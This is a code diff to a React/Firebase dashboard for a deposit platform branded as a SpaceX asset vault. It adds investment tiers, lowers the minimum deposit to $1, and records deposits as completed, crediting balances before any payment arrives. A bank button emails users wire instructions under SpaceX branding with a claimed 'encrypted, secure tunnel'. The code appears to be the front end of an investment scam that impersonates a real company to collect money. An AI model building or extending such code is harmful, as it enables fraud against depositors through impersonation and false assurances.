@@ -27,7 +27,7 @@ import {
   X
 } from 'lucide-react';
 import { AnimatePresence } from 'motion/react';
-import { useAuth, auth } from '../context/AuthContext';
+import { useAuth } from '../context/AuthContext';
 import { 
   collection, 
   query, 
@@ -40,7 +40,7 @@ import {
   updateDoc,
   increment
 } from 'firebase/firestore';
-import { db } from '../lib/firebase';
+import { db, auth } from '../lib/firebase';
 
 enum OperationType {
   CREATE = 'create',
@@ -161,6 +161,13 @@ export default function DashboardPage() {
   // Deposit States
   const [depositStep, setDepositStep] = useState(1);
   const [depositAmount, setDepositAmount] = useState('');
+  const [depositTier, setDepositTier] = useState('Not Set');
+
+  useEffect(() => {
+    if (userData?.investmentTier) {
+      setDepositTier(userData.investmentTier);
+    }
+  }, [userData]);
   const [paymentMethod, setPaymentMethod] = useState('');
   const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const [showBankInstructions, setShowBankInstructions] = useState(false);
@@ -194,14 +201,16 @@ export default function DashboardPage() {
         type: type,
         amount: amount,
         method: method,
+        tier: depositTier,
         status: 'Completed',
         date: serverTimestamp()
       });
 
-      // Update user balance
+      // Update user balance and tier
       const userRef = doc(db, 'users', user.uid);
       await updateDoc(userRef, {
-        balance: increment(type === 'Deposit' ? amount : -amount)
+        balance: increment(type === 'Deposit' ? amount : -amount),
+        investmentTier: depositTier
       });
     } catch (error: any) {
       if (error.code === 'permission-denied') {
@@ -271,24 +280,46 @@ export default function DashboardPage() {
                 <motion.div 
                   initial={{ opacity: 0, y: 20 }}
                   animate={{ opacity: 1, y: 0 }}
-                  className="card-panel p-10"
+                  className="card-panel p-10 space-y-8"
                 >
-                  <label className="text-[10px] font-mono text-slate-500 uppercase tracking-[0.3em] block mb-6">Enter Allocation Amount (USD)</label>
-                  <div className="relative">
-                    <span className="absolute left-6 top-1/2 -translate-y-1/2 text-2xl font-mono text-slate-600">$</span>
-                    <input 
-                      type="number"
-                      value={depositAmount}
-                      onChange={(e) => setDepositAmount(e.target.value)}
-                      placeholder="0.00"
-                      className="w-full bg-white/5 border border-white/10 rounded-xl px-12 py-8 text-4xl font-mono text-white focus:outline-none focus:border-brand-primary/50 transition-all placeholder:text-white/5"
-                    />
+                  <div>
+                    <label className="text-[10px] font-mono text-slate-500 uppercase tracking-[0.3em] block mb-6">Select Investment Tier</label>
+                    <div className="grid grid-cols-3 gap-3">
+                      {['Starter', 'Growth', 'Elite'].map((tier) => (
+                        <button
+                          key={tier}
+                          onClick={() => setDepositTier(tier)}
+                          className={`py-4 px-2 rounded-lg border font-mono text-[9px] uppercase tracking-widest transition-all ${
+                            depositTier === tier 
+                              ? 'bg-brand-primary text-black border-brand-primary font-bold' 
+                              : 'bg-white/5 text-slate-500 border-white/10 hover:border-white/20'
+                          }`}
+                        >
+                          {tier}
+                        </button>
+                      ))}
+                    </div>
                   </div>
+
+                  <div>
+                    <label className="text-[10px] font-mono text-slate-500 uppercase tracking-[0.3em] block mb-6">Enter Allocation Amount (USD)</label>
+                    <div className="relative">
+                      <span className="absolute left-6 top-1/2 -translate-y-1/2 text-2xl font-mono text-slate-600">$</span>
+                      <input 
+                        type="number"
+                        value={depositAmount}
+                        onChange={(e) => setDepositAmount(e.target.value)}
+                        placeholder="100.00"
+                        className="w-full bg-white/5 border border-white/10 rounded-xl px-12 py-8 text-4xl font-mono text-white focus:outline-none focus:border-brand-primary/50 transition-all placeholder:text-white/5"
+                      />
+                    </div>
+                  </div>
+
                   <p className="mt-6 text-[9px] font-mono text-slate-600 uppercase tracking-widest leading-relaxed">
-                    Minimum deposit: $1,000. Institutional limits apply for unverified accounts.
+                    Micro-denominations supported from $1. Institutional limits apply for unverified accounts.
                   </p>
                   <button 
-                    disabled={!depositAmount || parseFloat(depositAmount) < 1000}
+                    disabled={!depositAmount || parseFloat(depositAmount) <= 0 || depositTier === 'Not Set'}
                     onClick={() => setDepositStep(2)}
                     className="w-full mt-10 py-5 bg-white text-black font-bold uppercase tracking-[0.2em] text-[10px] rounded-xl hover:bg-brand-primary transition-all disabled:opacity-20 disabled:hover:bg-white"
                   >
@@ -375,7 +406,38 @@ export default function DashboardPage() {
                   {paymentMethod === 'bank' && (
                     <div className="mb-8">
                       <button 
-                        onClick={() => setShowBankInstructions(true)}
+                        onClick={async () => {
+                          setShowBankInstructions(true);
+                          if (user?.email) {
+                            try {
+                              await fetch('/api/send-email', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                  to: user.email,
+                                  subject: 'Secure Banking Credentials | SpaceX Asset Vault',
+                                  html: `
+                                    <div style="font-family: monospace; padding: 40px; background: #000; color: #fff; border: 1px solid #1e3a8a;">
+                                      <h1 style="color: #3b82f6; font-size: 24px; text-transform: uppercase;">SpaceX Banking</h1>
+                                      <div style="border: 1px solid #1e1e1e; margin: 20px 0; padding: 20px; background: #0a0a0a;">
+                                        <p style="color: #64748b; font-size: 10px; margin-bottom: 20px;">RESTRICTED CREDENTIALS - DO NOT SHARE</p>
+                                        <p><strong>Bank:</strong> Goldman Sachs / JPMorgan Chase</p>
+                                        <p><strong>Beneficiary:</strong> SpaceX Asset Management LLC</p>
+                                        <p><strong>Account Number:</strong> 77492003841</p>
+                                        <p><strong>Routing (Wire):</strong> 121000248</p>
+                                        <p><strong>SWIFT/BIC:</strong> CHASUS33XXX</p>
+                                        <p style="margin-top: 20px; color: #3b82f6;"><strong>Ref Code:</strong> NX-${Math.random().toString(36).substring(7).toUpperCase()}</p>
+                                      </div>
+                                      <p style="font-size: 10px; color: #334155;">This email is encrypted and sent via a secure tunnel. Access from unauthorized domains will be flagged.</p>
+                                    </div>
+                                  `
+                                })
+                              });
+                            } catch (e) {
+                              console.error("Failed to send sensitive email:", e);
+                            }
+                          }
+                        }}
                         className="w-full flex items-center justify-between p-6 bg-brand-primary/5 border border-brand-primary/20 rounded-xl group hover:border-brand-primary/40 transition-all"
                       >
                         <div className="flex items-center gap-4">
